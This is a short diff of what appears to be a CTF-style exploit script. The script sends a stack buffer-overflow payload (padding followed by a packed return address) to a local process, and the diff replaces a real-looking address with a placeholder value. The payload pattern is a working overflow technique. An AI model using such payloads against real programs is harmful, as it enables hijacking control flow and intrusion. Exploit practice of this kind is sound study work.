@@ -10,8 +10,8 @@ def u64(s):
     return struct.unpack('Q', s)[0]
 
 p = interact.Process()
-p.readuntil('Enter data:')
-p.sendline('A'*32 + 'B'*8 + p64(0x401358))
+p.readuntil('Enter data: ')
+p.sendline('A'*32 + 'B'*8 + p64(0xDEADBEEF0BADC0DE))
 # data = p.readuntil('\n')
 # p.sendline('hello')
 
